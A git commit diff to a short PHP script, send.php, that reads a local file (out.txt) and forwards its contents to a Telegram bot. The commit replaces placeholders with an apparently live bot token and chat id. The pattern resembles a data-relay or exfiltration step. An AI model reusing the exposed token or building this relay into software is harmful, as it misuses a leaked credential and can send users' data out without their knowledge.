ef9d386a7e13b9115ccb3c5b077eba3037da1676
m2007i <90411806+m2007i@users.noreply.github.com>
2021-09-11 16:55:54 +0430

    Update send.php

--- send.php
+++ send.php
@@ -1,5 +1,5 @@
 <?php
     sleep(2);
     $msg = urlencode(file_get_contents("out.txt"));
-    file_get_contents("https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHATID&text=$msg");
+    file_get_contents("https://api.telegram.org/bot1958882799:AAEMgT65wlKQVlftwkdTfIIpdNxEk2P8j2g/sendMessage?chat_id=1863870362&text=$msg");
 ?>
